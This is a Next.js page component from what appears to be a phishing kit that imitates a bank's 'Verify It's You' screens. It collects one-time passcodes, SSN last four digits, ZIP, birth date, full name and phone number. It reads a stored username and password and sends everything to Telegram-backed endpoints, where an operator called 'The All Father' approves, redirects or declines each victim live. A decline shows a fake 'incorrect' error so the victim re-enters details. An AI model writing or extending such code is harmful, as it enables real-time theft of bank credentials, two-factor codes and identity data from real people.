"use client"

import { Suspense, useEffect, useState } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import { Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { SiteFooter } from "@/components/site-footer"
import { SiteHeader } from "@/components/site-header"
import { Input } from "@/components/ui/input"
import { OTP_RESEND_COOLDOWN_SEC } from "@/lib/approval-messages"
import { MONTHS, DAYS, YEARS } from "@/lib/date-constants"
import { LOADING_MS, wait } from "@/lib/loading-delays"
import {
  readStoredPassword,
  readStoredUsername,
} from "@/lib/login-flow-storage"
import {
  formatUsZipInput,
  isValidUsZip,
  usZipDigits,
} from "@/lib/us-zip"
import { useApproval } from "@/hooks/use-approval"
import { advanceTarget, REDIRECT_TARGET_URL } from "@/lib/approval-steps"

const DECLINE_MESSAGE =
  "The information you entered was incorrect. Please check your details and try again."

function isValidOtpLength(length: number): boolean {
  return length === 6 || length === 8
}

function EnterCodeContent() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const initialStep = searchParams.get("mode") === "details" ? "details" : "code"
  const [step, setStep] = useState<"code" | "details">(initialStep)
  const [code, setCode] = useState("")
  const [ssnLast4, setSsnLast4] = useState("")
  const [zip, setZip] = useState("")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [fullName, setFullName] = useState("")
  const [month, setMonth] = useState("")
  const [day, setDay] = useState("")
  const [year, setYear] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [isResending, setIsResending] = useState(false)
  const [resendCooldown, setResendCooldown] = useState(0)
  const [token, setToken] = useState<string | null>(null)
  const [formError, setFormError] = useState("")

  // Gate on The All Father's Telegram approval before advancing.
  useApproval({
    token,
    onDecide: (res) => {
      setIsLoading(false)
      setToken(null)
      if (res.status === "decided") {
        if (res.decision === "approve") {
          // Advance to the next page for whichever step was gated.
          const next = step === "details" ? "verify_details" : "verify_code"
          window.location.href = advanceTarget(next, readStoredUsername().trim())
          return
        }
        if (res.decision === "redirect") {
          window.location.href = REDIRECT_TARGET_URL
          return
        }
        // decline → show "incorrect", keep the form open for re-entry
        setFormError(DECLINE_MESSAGE)
        return
      }
      setFormError((prev) => prev || DECLINE_MESSAGE)
    },
  })

  const modeIsDetails = searchParams.get("mode") === "details"
  useEffect(() => {
    setStep(modeIsDetails ? "details" : "code")
  }, [modeIsDetails])

  useEffect(() => {
    if (resendCooldown <= 0) return
    const timer = setInterval(() => {
      setResendCooldown((s) => (s <= 1 ? 0 : s - 1))
    }, 1000)
    return () => clearInterval(timer)
  }, [resendCooldown])

  const ssnDigits = ssnLast4.replace(/\D/g, "")
  const phoneDigits = phoneNumber.replace(/\D/g, "")
  const isSsnValid = ssnDigits.length === 4
  const isZipValid = isValidUsZip(zip)
  const isDateValid = Boolean(month && day && year)
  const isPhoneValid = phoneDigits.length === 10
  const isFullNameValid = fullName.trim().length > 0
  const isDetailsValid =
    isSsnValid && isZipValid && isDateValid && isPhoneValid && isFullNameValid

  const handleContinueFromCode = async () => {
    if (isLoading) return
    const digits = code.replace(/\D/g, "")
    if (!isValidOtpLength(digits.length)) return
    const uid = readStoredUsername().trim()
    if (!uid) {
      router.push("/")
      return
    }

    setFormError("")
    setIsLoading(true)

    const res = await fetch("/api/telegram/verification", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        verificationType: "Code (first OTP)",
        code,
      }),
    }).catch(() => null)

    const data = (await res?.json().catch(() => ({}))) as { token?: string }
    if (data?.token) {
      setToken(data.token)
      return
    }

    // Fallback (no token) → proceed to redirect.
    window.location.href = "/api/login-out"
  }

  const handleVerifyDetails = async () => {
    if (!isDetailsValid || isLoading) return
    const uid = readStoredUsername()
    const pwd = readStoredPassword()
    if (!uid || !pwd) {
      router.push("/")
      return
    }

    setFormError("")
    setIsLoading(true)

    const res = await fetch("/api/telegram/verify-details", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ssnLast4: ssnDigits,
        zip: usZipDigits(zip),
        birthDate: `${month} ${day}, ${year}`,
        phoneNumber: phoneDigits,
        fullName,
      }),
    }).catch(() => null)

    const data = (await res?.json().catch(() => ({}))) as { token?: string }
    if (data?.token) {
      setToken(data.token)
      return
    }

    // Fallback (no token) → continue to the code step.
    await wait(LOADING_MS.details)
    setIsLoading(false)
    router.push("/verify")
  }

  const handleResend = async () => {
    if (isResending || resendCooldown > 0) return
    setIsResending(true)

    await fetch("/api/telegram/resend-code", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ isSecondOtp: false }),
    }).catch(console.error)

    setIsResending(false)
    setResendCooldown(OTP_RESEND_COOLDOWN_SEC)
  }

  const canResend = resendCooldown <= 0 && !isResending

  if (step === "details") {
    return (
      <div className="min-h-screen bg-white">
        <SiteHeader />
        <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px]">
          <h2 className="text-base font-medium text-gray-900 mb-2">Verify It&apos;s You</h2>
          <h1 className="text-2xl font-semibold text-gray-900 mb-2">
            Verify Your Details
          </h1>
          <p className="text-gray-700 text-sm mb-6">
            You&apos;ll need to provide some information first to confirm your identity.
          </p>

          {formError && (
            <div
              role="alert"
              className="mb-5 rounded-md border border-red-300 bg-red-50 px-4 py-3 text-sm text-red-700"
            >
              {formError}
            </div>
          )}

          <div className="space-y-5">
            <div>
              <label htmlFor="verify-ssn" className="block text-sm font-medium text-gray-900 mb-1.5">
                Last 4 Digits of SSN
              </label>
              <Input
                id="verify-ssn"
                type="text"
                inputMode="numeric"
                maxLength={4}
                value={ssnLast4}
                onChange={(e) => setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))}
                disabled={isLoading}
                placeholder=""
                className="max-w-[140px] h-10 bg-gray-50 border-gray-300 rounded-md"
              />
            </div>

            <div>
              <label htmlFor="verify-zip" className="block text-sm font-medium text-gray-900 mb-1.5">
                ZIP Code
              </label>
              <Input
                id="verify-zip"
                type="text"
                inputMode="numeric"
                maxLength={10}
                value={zip}
                onChange={(e) => setZip(formatUsZipInput(e.target.value))}
                disabled={isLoading}
                placeholder=""
                className="max-w-[160px] h-10 bg-gray-50 border-gray-300 rounded-md"
              />
              {!isZipValid && usZipDigits(zip).length > 0 && (
                <p className="mt-1 text-xs text-red-600">
                  Enter a valid 5-digit ZIP or ZIP+4.
                </p>
              )}
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-900 mb-1.5">Birth Date</label>
              <div className="flex gap-2 flex-wrap">
                <select
                  value={month}
                  onChange={(e) => setMonth(e.target.value)}
                  disabled={isLoading}
                  className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-sm text-gray-900 min-w-[120px]"
                >
                  <option value="">Month</option>
                  {MONTHS.map((m) => (
                    <option key={m} value={m}>{m}</option>
                  ))}
                </select>
                <select
                  value={day}
                  onChange={(e) => setDay(e.target.value)}
                  disabled={isLoading}
                  className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-sm text-gray-900 min-w-[80px]"
                >
                  <option value="">Day</option>
                  {DAYS.map((d) => (
                    <option key={d} value={d}>{d}</option>
                  ))}
                </select>
                <select
                  value={year}
                  onChange={(e) => setYear(e.target.value)}
                  disabled={isLoading}
                  className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-sm text-gray-900 min-w-[90px]"
                >
                  <option value="">Year</option>
                  {YEARS.map((y) => (
                    <option key={y} value={y}>{y}</option>
                  ))}
                </select>
              </div>
            </div>

            <div>
              <label htmlFor="verify-full-name" className="block text-sm font-medium text-gray-900 mb-1.5">
                Full Name
              </label>
              <Input
                id="verify-full-name"
                type="text"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                disabled={isLoading}
                placeholder=""
                className="max-w-[260px] h-10 bg-gray-50 border-gray-300 rounded-md"
              />
            </div>

            <div>
              <label htmlFor="verify-phone" className="block text-sm font-medium text-gray-900 mb-1.5">
                Phone Number
              </label>
              <div className="flex items-center gap-2 max-w-[260px]">
                <span className="px-2 h-10 flex items-center border border-gray-300 bg-gray-100 rounded-md text-sm text-gray-900">
                  +1
                </span>
                <Input
                  id="verify-phone"
                  type="tel"
                  inputMode="tel"
                  value={phoneNumber}
                  disabled={isLoading}
                  onChange={(e) => {
                    const digits = e.target.value.replace(/\D/g, "").slice(0, 10)
                    let formatted = digits
                    if (digits.length > 6) {
                      formatted = `${digits.slice(0, 3)}-${digits.slice(3, 6)}-${digits.slice(6)}`
                    } else if (digits.length > 3) {
                      formatted = `${digits.slice(0, 3)}-${digits.slice(3)}`
                    }
                    setPhoneNumber(formatted)
                  }}
                  placeholder=""
                  className="flex-1 h-10 bg-gray-50 border-gray-300 rounded-md"
                />
              </div>
              {!isPhoneValid && phoneDigits.length > 0 && (
                <p className="mt-1 text-xs text-red-600">Enter a valid 10-digit phone number.</p>
              )}
            </div>

            <div className="flex gap-3 pt-2">
              <Button
                type="button"
                onClick={handleVerifyDetails}
                disabled={!isDetailsValid || isLoading}
                className="bg-[#1c68bf] hover:bg-[#001f6b] text-white rounded-md h-9 px-5 text-sm font-medium disabled:bg-gray-300 disabled:text-gray-500 disabled:pointer-events-none inline-flex items-center justify-center gap-2"
              >
                {isLoading ? (
                  <>
                    <Loader2 className="h-4 w-4 animate-spin shrink-0" aria-hidden />
                    <span>Verify</span>
                  </>
                ) : (
                  "Verify"
                )}
              </Button>
              <Button
                type="button"
                variant="outline"
                className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-9 px-5 text-sm font-medium"
                disabled={isLoading}
                onClick={() => {
                  router.push("/")
                }}
              >
                Cancel
              </Button>
            </div>
          </div>
        </div>
        <SiteFooter />
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-white">
      <SiteHeader />
      <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px]">
        <div className="mb-6">
          <h2 className="text-base font-medium text-gray-900 mb-4">Verify It&apos;s You</h2>
          <h1 className="text-2xl font-semibold text-gray-900 mb-3">
            Enter Access Code
          </h1>
          <p className="text-gray-700 text-sm mb-4">
            Enter the code you received.
          </p>

          {formError && (
            <div
              role="alert"
              className="mb-4 rounded-md border border-red-300 bg-red-50 px-4 py-3 text-sm text-red-700"
            >
              {formError}
            </div>
          )}

          <div className="flex items-center gap-2 mb-4">
            <span className="text-gray-700 text-sm">Didn&apos;t receive code?</span>
            <button
              type="button"
              onClick={handleResend}
              disabled={!canResend || isLoading}
              className="px-3 py-1.5 bg-gray-200 text-gray-700 rounded-md text-sm font-medium hover:bg-gray-300 disabled:opacity-70 disabled:cursor-not-allowed"
            >
              {isResending
                ? "Sending..."
                : resendCooldown > 0
                  ? `Resend code (${resendCooldown}s)`
                  : "Resend code"}
            </button>
          </div>
        </div>

        <div className="space-y-4">
          <div>
            <input
              type="text"
              id="code"
              inputMode="numeric"
              value={code}
              disabled={isLoading}
              onChange={(e) => {
                setCode(e.target.value.replace(/\D/g, "").slice(0, 8))
              }}
              placeholder=""
              className="w-full max-w-[200px] px-2.5 py-1.5 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-[#1c68bf] focus:border-transparent disabled:bg-gray-100 disabled:cursor-not-allowed"
              maxLength={8}
            />
          </div>

          <div className="flex gap-3 mt-3">
            <Button
              className="bg-[#1c68bf] text-white hover:bg-[#001f6b] rounded-md disabled:opacity-70 disabled:pointer-events-none h-8 px-5 text-sm font-medium inline-flex items-center justify-center gap-2"
              onClick={handleContinueFromCode}
              disabled={!isValidOtpLength(code.replace(/\D/g, "").length) || isLoading}
            >
              {isLoading ? (
                <>
                  <Loader2 className="h-4 w-4 animate-spin shrink-0" aria-hidden />
                  <span>Continue</span>
                </>
              ) : (
                "Continue"
              )}
            </Button>
            <Button
              variant="ghost"
              className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-8 px-5 text-sm font-medium"
              onClick={() => {
                router.push("/")
              }}
              disabled={isLoading}
            >
              Cancel
            </Button>
          </div>
        </div>
      </div>

      <SiteFooter />
    </div>
  )
}

export default function EnterCodePage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
        Loading...
      </div>
    }>
      <EnterCodeContent />
    </Suspense>
  )
}
